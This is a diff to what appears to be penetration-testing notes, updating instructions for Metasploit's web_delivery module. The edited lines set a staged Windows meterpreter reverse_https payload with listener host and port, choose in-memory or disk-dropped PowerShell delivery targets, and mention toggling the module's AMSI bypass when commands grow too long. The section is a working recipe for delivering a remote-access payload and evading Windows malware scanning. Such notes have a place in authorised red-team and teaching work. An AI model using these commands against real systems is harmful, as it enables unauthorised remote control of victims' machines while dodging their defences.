@@ -205,16 +205,22 @@ The [web delivery Metasploit module](https://www.offensive-security.com/metasplo
 ```sh
 use exploit/multi/script/web_delivery
 
-# Adjust payload as necessary.
-set payload windows/meterpreter/reverse_tcp
+# Adjust payload as necessary; make sure to use a staged payload, otherwise generated
+# PowerShell commmands will likely exceed the 8192-character command-line limit on
+# Windows.
+set payload payload/windows/x64/meterpreter/reverse_https
 set LHOST 0.0.0.0
 set LPORT 1337
 
 # For in-memory PowerShell payload.
-set payload PSH
+set target PSH
 
 # For PowerShell payload that gets dropped to disk.
-set payload PSH (Binary)
+set target PSH (Binary)
+
+# If you run into reported errors about PowerShell command length being too long, try
+# disabling the generated AMSI bypasses that get added:
+set Powershell::prepend_protections_bypass false
 
 # Run the module. This will host the final payload on an HTTP server, print the
 # command to be run on target to download and execute the payload, and run the
